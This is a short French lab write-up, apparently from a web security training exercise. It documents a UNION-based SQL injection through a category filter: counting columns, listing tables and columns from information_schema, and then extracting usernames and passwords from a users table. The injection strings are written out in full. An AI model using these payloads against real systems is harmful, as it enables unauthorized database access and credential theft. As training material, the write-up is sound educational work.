
![](../../Img/Pasted%20image%2020260722160523.png)

On peut voir qu'il y a une page login et un filtre, on va tester le filtre voir il y a combien de columns 
![](../../Img/Pasted%20image%2020260722160528.png)
'+ORDER+BY+3--
![](../../Img/Pasted%20image%2020260722160534.png)
que 2 colunms


on va mtn voir il y a combien de tables avc ca : 
![](Pasted%20image%2020260722160540.png)

pour voir les tables qu'il y a 
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
![](Pasted%20image%2020260722160547.png)

on va mtn chercher celle avc les credentials, la table qui les détient 
![](Pasted%20image%2020260722160559.png)
par exemple, on va test pg_user
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name = 'pg_user'--
![](Pasted%20image%2020260722160607.png)
on peut voir que c'est pas le bon mais on arrive à y acceder 


ON VA TEST LE BON 
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name = 'users_ygtakz'--

on doit deviner quel deb contient quoi donc oui sa peut prendre du temps à tout fouiller
![](Pasted%20image%2020260722160617.png)

et mainteant qu'on a trouvé les columns qui nous intéresse dans la table users_ygtakz

'+UNION+SELECT+username_phgwjs,password_mnddhn+FROM+users_ygtakz--
![](Pasted%20image%2020260722160624.png)
et hop on a les credentials